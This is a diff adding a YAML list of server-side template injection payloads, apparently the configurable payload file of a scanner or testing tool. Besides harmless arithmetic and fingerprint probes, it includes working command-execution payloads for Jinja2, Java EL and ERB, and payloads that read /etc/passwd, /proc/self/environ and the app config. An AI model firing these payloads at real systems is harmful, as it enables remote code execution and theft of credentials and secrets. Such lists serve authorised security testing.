@@ -1,0 +1,36 @@
+# Server-Side Template Injection (SSTI) Payloads
+# Edit this file to add or remove payloads without touching source code.
+
+payloads:
+  arithmetic:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "#{7*7}"
+    - "*{7*7}"
+    - "{{7*'7'}}"
+    - "${7*'7'}"
+
+  engine_fingerprint:
+    - "{{7*7}}"
+    - "{{7*'7'}}"
+    - "{{config}}"
+    - "{{self}}"
+    - "{{_self}}"
+    - "{{_self.env}}"
+    - "${7*7}"
+    - "#{7*7}"
+    - "<%= 7*7 %>"
+    - "{{7*7}}"
+
+  evaluation:
+    - "{{''.__class__.__mro__[2].__subclasses__()}}"
+    - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    - "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    - "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"
+    - "<%= system('id') %>"
+
+  read_proof:
+    - "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}"
+    - "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
+    - "{{ config.items() }}"
+    - "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/proc/self/environ').read() }}"
